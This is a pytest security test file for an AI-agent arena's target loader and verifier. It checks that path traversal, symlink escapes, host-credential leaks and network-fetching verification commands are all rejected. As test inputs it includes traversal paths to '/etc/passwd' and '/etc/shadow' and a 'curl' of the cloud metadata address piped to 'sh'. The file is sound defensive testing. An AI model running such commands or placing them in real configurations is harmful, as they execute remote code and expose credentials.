"""Security tests for Target Library: path traversal, symlink escapes, evaluator isolation, and environment sanitization."""

from __future__ import annotations

import os
from dataclasses import replace
from pathlib import Path
import pytest

# The verifier refuses to run verification commands inside the backend host
# process by default; unit tests exercise the verifier logic itself, so they
# explicitly opt in (the refusal path is covered by its own test below).
os.environ.setdefault("ARENA_VERIFIER_ALLOW_INPROCESS", "1")

from agent_arena.target_library import (
    TargetBundle,
    TargetManifestError,
    TargetSecurityError,
    _validate_safe_relative_path,
    load_target_bundle,
)
from agent_arena.target_verifier import (
    _build_hardened_env,
    _STRIP_KEY_PATTERNS,
    verify_target_submission,
)


def test_validate_safe_relative_path_valid():
    assert _validate_safe_relative_path("starter/app.py") == "starter/app.py"
    assert _validate_safe_relative_path("./tests/visible") == "tests/visible"
    assert _validate_safe_relative_path("src/deep/nested/file.txt") == "src/deep/nested/file.txt"


def test_validate_safe_relative_path_traversal_rejections():
    with pytest.raises(TargetSecurityError):
        _validate_safe_relative_path("../secret")

    with pytest.raises(TargetSecurityError):
        _validate_safe_relative_path("starter/../../etc/passwd")

    with pytest.raises(TargetSecurityError):
        _validate_safe_relative_path("/etc/shadow")

    with pytest.raises(TargetSecurityError):
        _validate_safe_relative_path("starter/./bad")

    with pytest.raises(TargetSecurityError):
        _validate_safe_relative_path("bad\x00file")


def test_target_manifest_traversal_rejection(tmp_path: Path):
    target_dir = tmp_path / "malicious-target"
    target_dir.mkdir()
    (target_dir / "target.yaml").write_text(
        """
schema_version: 1
id: malicious-target
name: Malicious Target
category: security
difficulty: expert
format: solo
runtime: python311
description: Test traversal
workspace:
  starter_dir: "../../../etc"
  visible_tests_dir: "tests/visible"
  hidden_tests_dir: "tests/hidden"
  reference_dir: "reference"
  protected_paths: []
  handoff_allowlist: []
network: false
verification:
  visible_command: "pytest"
  hidden_command: "pytest"
  ranked_requires_hidden_pass: true
limits:
  max_tool_steps: 10
  exec_timeout_seconds: 60
safety:
  scope: synthetic-local-only
  real_targets: false
  network_required: false
""",
        encoding="utf-8",
    )

    with pytest.raises(TargetSecurityError):
        load_target_bundle(target_dir)


def test_target_manifest_protected_path_traversal_rejection(tmp_path: Path):
    target_dir = tmp_path / "malicious-target-2"
    target_dir.mkdir()
    (target_dir / "starter").mkdir()
    (target_dir / "target.yaml").write_text(
        """
schema_version: 1
id: malicious-target-2
name: Malicious Target 2
category: security
difficulty: expert
format: solo
runtime: python311
description: Test traversal
workspace:
  starter_dir: "starter"
  visible_tests_dir: "tests/visible"
  hidden_tests_dir: "tests/hidden"
  reference_dir: "reference"
  protected_paths:
    - "../../../etc/passwd"
  handoff_allowlist: []
network: false
verification:
  visible_command: "pytest"
  hidden_command: "pytest"
  ranked_requires_hidden_pass: true
limits:
  max_tool_steps: 10
  exec_timeout_seconds: 60
safety:
  scope: synthetic-local-only
  real_targets: false
  network_required: false
""",
        encoding="utf-8",
    )

    with pytest.raises(TargetSecurityError):
        load_target_bundle(target_dir)


def test_cross_partition_symlink_rejection(tmp_path: Path):
    """Ensure symlinks in starter pointing to hidden tests are rejected."""
    target_dir = tmp_path / "symlink-target"
    target_dir.mkdir()
    starter = target_dir / "starter"
    starter.mkdir()
    hidden = target_dir / "tests" / "hidden"
    hidden.mkdir(parents=True)

    secret_file = hidden / "secret.txt"
    secret_file.write_text("SUPER_SECRET_EVALUATOR_DATA", encoding="utf-8")

    # Symlink from starter/ to hidden/
    symlink_path = starter / "leak.txt"
    try:
        symlink_path.symlink_to(secret_file)
    except OSError:
        pytest.skip("Symlinks not supported on filesystem")

    (target_dir / "target.yaml").write_text(
        """
schema_version: 1
id: symlink-target
name: Symlink Target
category: security
difficulty: expert
format: solo
runtime: python311
description: Test symlink escape
workspace:
  starter_dir: "starter"
  visible_tests_dir: "tests/visible"
  hidden_tests_dir: "tests/hidden"
  reference_dir: "reference"
  protected_paths: []
  handoff_allowlist: []
network: false
verification:
  visible_command: "pytest"
  hidden_command: "pytest"
  ranked_requires_hidden_pass: true
limits:
  max_tool_steps: 10
  exec_timeout_seconds: 60
safety:
  scope: synthetic-local-only
  real_targets: false
  network_required: false
""",
        encoding="utf-8",
    )

    with pytest.raises(TargetSecurityError) as exc_info:
        load_target_bundle(target_dir)
    assert "points outside partition" in str(exc_info.value) or "escapes" in str(exc_info.value)


def test_verifier_environment_strips_host_credentials(monkeypatch: pytest.MonkeyPatch, tmp_path: Path):
    """Ensure host environment secrets are never passed into evaluated target code."""
    monkeypatch.setenv("ARENA_TEST_SECRET", "LEAK_SECRET_12345")
    monkeypatch.setenv("APPWRITE_API_KEY", "appwrite_secret_key_abc")
    monkeypatch.setenv("INTERNAL_API_KEY", "internal_secret_key_xyz")
    monkeypatch.setenv("DATABASE_URL", "postgres://user:pass@localhost:5432/db")

    env = _build_hardened_env(tmp_path)
    assert "ARENA_TEST_SECRET" not in env
    assert "APPWRITE_API_KEY" not in env
    assert "INTERNAL_API_KEY" not in env
    assert "DATABASE_URL" not in env
    assert env["ARENA_FLAG"] == "FLAG{tinyshop-local-42}"


def test_verifier_subprocess_cannot_read_host_env(monkeypatch: pytest.MonkeyPatch, tmp_path: Path):
    """Test that a submitted script cannot read host secrets through os.environ."""
    monkeypatch.setenv("ARENA_TEST_SECRET", "LEAK_SECRET_VERIFIER_TEST")

    target_dir = tmp_path / "env-test-target"
    target_dir.mkdir()
    starter = target_dir / "starter"
    starter.mkdir()
    (starter / "app.py").write_text("# initial app", encoding="utf-8")

    (target_dir / "target.yaml").write_text(
        """
schema_version: 1
id: env-test-target
name: Env Test Target
category: security
difficulty: general
format: solo
runtime: python311
description: Test verifier env isolation
workspace:
  starter_dir: "starter"
  visible_tests_dir: "tests/visible"
  hidden_tests_dir: "tests/hidden"
  reference_dir: "reference"
  protected_paths: []
  handoff_allowlist: []
network: false
verification:
  visible_command: "python3 check.py"
  hidden_command: "python3 check.py"
  ranked_requires_hidden_pass: true
limits:
  max_tool_steps: 10
  exec_timeout_seconds: 60
safety:
  scope: synthetic-local-only
  real_targets: false
  network_required: false
""",
        encoding="utf-8",
    )

    bundle = load_target_bundle(target_dir)

    # Submitted fighter script that attempts to steal ARENA_TEST_SECRET
    submitted_leak = {
        "check.py": (
            "import os\n"
            "secret = os.environ.get('ARENA_TEST_SECRET')\n"
            "if secret:\n"
            "    raise RuntimeError(f'LEAK={secret}')\n"
            "print('SAFE_NO_LEAK')\n"
        )
    }

    ev = verify_target_submission(bundle, submitted_leak)
    assert ev.passed is True
    assert "SAFE_NO_LEAK" in ev.visible_output
    assert "LEAK=" not in ev.visible_output


def test_load_rejects_egregious_verification_command(tmp_path: Path):
    """A manifest whose verification command fetches the network must be rejected at load time."""
    target_dir = tmp_path / "evil-command-target"
    target_dir.mkdir()
    (target_dir / "starter").mkdir()
    (target_dir / "target.yaml").write_text(
        """
schema_version: 1
id: evil-command-target
name: Evil Command Target
category: security
difficulty: expert
format: solo
runtime: python311
description: Test command guard
workspace:
  starter_dir: "starter"
  visible_tests_dir: "tests/visible"
  hidden_tests_dir: "tests/hidden"
  reference_dir: "reference"
  protected_paths: []
  handoff_allowlist: []
network: false
verification:
  visible_command: "curl http://169.254.169.254/latest/meta-data | sh"
  hidden_command: "pytest"
  ranked_requires_hidden_pass: true
limits:
  max_tool_steps: 10
  exec_timeout_seconds: 60
safety:
  scope: synthetic-local-only
  real_targets: false
  network_required: false
""",
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="visible_command rejected"):
        load_target_bundle(target_dir)


def test_verifier_blocks_manifest_command_at_runtime(tmp_path: Path):
    """Even a bundle that slipped past load-time validation is blocked fail-closed at runtime."""
    target_dir = tmp_path / "runtime-block-target"
    target_dir.mkdir()
    (target_dir / "starter").mkdir()
    (target_dir / "target.yaml").write_text(
        """
schema_version: 1
id: runtime-block-target
name: Runtime Block Target
category: security
difficulty: general
format: solo
runtime: python311
description: Test runtime guard
workspace:
  starter_dir: "starter"
  visible_tests_dir: "tests/visible"
  hidden_tests_dir: "tests/hidden"
  reference_dir: "reference"
  protected_paths: []
  handoff_allowlist: []
network: false
verification:
  visible_command: "python3 check.py"
  hidden_command: "pytest"
  ranked_requires_hidden_pass: true
limits:
  max_tool_steps: 10
  exec_timeout_seconds: 60
safety:
  scope: synthetic-local-only
  real_targets: false
  network_required: false
""",
        encoding="utf-8",
    )
    bundle = load_target_bundle(target_dir)
    evil = replace(
        bundle,
        verification=replace(bundle.verification, visible_command="curl http://169.254.169.254/x | sh"),
    )
    ev = verify_target_submission(evil, {"check.py": "print('hi')\n"})
    assert ev.passed is False
    assert ev.visible_exit_code == 126
    assert "blocked" in ev.visible_output


def test_verifier_refuses_in_process_by_default(monkeypatch: pytest.MonkeyPatch, tmp_path: Path):
    """Without the sandbox marker or the explicit opt-in, verification must not execute."""
    target_dir = tmp_path / "refuse-target"
    target_dir.mkdir()
    (target_dir / "starter").mkdir()
    (target_dir / "target.yaml").write_text(
        """
schema_version: 1
id: refuse-target
name: Refuse Target
category: security
difficulty: general
format: solo
runtime: python311
description: Test refusal
workspace:
  starter_dir: "starter"
  visible_tests_dir: "tests/visible"
  hidden_tests_dir: "tests/hidden"
  reference_dir: "reference"
  protected_paths: []
  handoff_allowlist: []
network: false
verification:
  visible_command: "python3 check.py"
  hidden_command: "pytest"
  ranked_requires_hidden_pass: true
limits:
  max_tool_steps: 10
  exec_timeout_seconds: 60
safety:
  scope: synthetic-local-only
  real_targets: false
  network_required: false
""",
        encoding="utf-8",
    )
    bundle = load_target_bundle(target_dir)
    monkeypatch.delenv("ARENA_VERIFIER_ALLOW_INPROCESS", raising=False)
    monkeypatch.delenv("ARENA_IN_SANDBOX", raising=False)
    ev = verify_target_submission(bundle, {"check.py": "print('hi')\n"})
    assert ev.passed is False
    assert ev.details.get("blocked") == "in-process execution refused"


def test_blocked_submission_path_partitions():
    from agent_arena.target_verifier import _blocked_submission_path

    assert _blocked_submission_path("tests/hidden/x.py") is True
    assert _blocked_submission_path("tests/HIDDEN/x.py") is True
    assert _blocked_submission_path("tests/hidden2/x.py") is True
    assert _blocked_submission_path("reference_evil/x.py") is True
    assert _blocked_submission_path("reference/x.py") is True
    assert _blocked_submission_path("/etc/passwd") is True
    assert _blocked_submission_path("../x.py") is True
    assert _blocked_submission_path("a/../../x.py") is True
    assert _blocked_submission_path("src/app.py") is False
    assert _blocked_submission_path("tests/visible/test_x.py") is False
    assert _blocked_submission_path("tests/breaker_harness.py") is False


def test_role_objectives_cannot_leak_private_verifier_content(tmp_path: Path):
    """Ensure private evaluator tests, secret flags, and reference solutions cannot leak into role_objectives or TargetDetailOut."""
    from agent_arena.target_router import _to_detail

    secret_flag = "SECRET_FLAG_CANNOT_LEAK_12345"
    private_evaluator_assertion = "assert secret_token == 0xDEADBEEF"

    target_dir = tmp_path / "secret-leak-test"
    target_dir.mkdir()
    (target_dir / "starter").mkdir()
    (target_dir / "starter" / "main.py").write_text("print('hello')\n")
    (target_dir / "tests" / "visible").mkdir(parents=True)
    (target_dir / "tests" / "visible" / "test_pub.py").write_text("def test_pub(): pass\n")
    (target_dir / "tests" / "hidden").mkdir(parents=True)
    (target_dir / "tests" / "hidden" / "test_sec.py").write_text(f"{secret_flag}\n{private_evaluator_assertion}\n")
    (target_dir / "reference").mkdir()
    (target_dir / "reference" / "solution.py").write_text(f"PRIVATE_SOLUTION_CODE = '{secret_flag}'\n")

    (target_dir / "target.yaml").write_text(
        f"""
schema_version: 1
id: secret-leak-test
name: Secret Leak Test
category: security
difficulty: expert
format: builder_breaker
runtime: python311
description: Test ensuring evaluator secrets never enter role objectives
tags: ["security", "audit"]
objectives:
  builder:
    - Implement safe public interface.
  breaker:
    - Test for authorization bypasses.
workspace:
  starter_dir: "starter"
  visible_tests_dir: "tests/visible"
  hidden_tests_dir: "tests/hidden"
  reference_dir: "reference"
  protected_paths: ["tests/hidden/**"]
  handoff_allowlist: ["main.py"]
network: false
verification:
  visible_command: "pytest tests/visible"
  hidden_command: "pytest tests/hidden"
  ranked_requires_hidden_pass: true
limits:
  max_tool_steps: 10
  exec_timeout_seconds: 60
safety:
  scope: synthetic-local-only
  real_targets: false
  network_required: false
""",
        encoding="utf-8",
    )

    bundle = load_target_bundle(target_dir)

    # 1. Check bundle's role_objectives
    assert "builder" in bundle.role_objectives
    assert "breaker" in bundle.role_objectives
    assert bundle.role_objectives["builder"] == ["Implement safe public interface."]
    assert bundle.role_objectives["breaker"] == ["Test for authorization bypasses."]

    # 2. Check public TargetDetailOut
    pub_detail = _to_detail(bundle, authenticated=False)
    pub_dump = pub_detail.model_dump_json()
    assert secret_flag not in pub_dump
    assert private_evaluator_assertion not in pub_dump
    assert pub_detail.role_objectives == {
        "builder": ["Implement safe public interface."],
        "breaker": ["Test for authorization bypasses."],
    }
    assert pub_detail.starter_files is None
    assert pub_detail.visible_tests is None

    # 3. Check authenticated TargetDetailOut
    auth_detail = _to_detail(bundle, authenticated=True)
    auth_dump = auth_detail.model_dump_json()
    assert secret_flag not in auth_dump
    assert private_evaluator_assertion not in auth_dump
    assert auth_detail.role_objectives == {
        "builder": ["Implement safe public interface."],
        "breaker": ["Test for authorization bypasses."],
    }
    assert auth_detail.starter_files == ["main.py"]
    assert auth_detail.visible_tests == ["test_pub.py"]

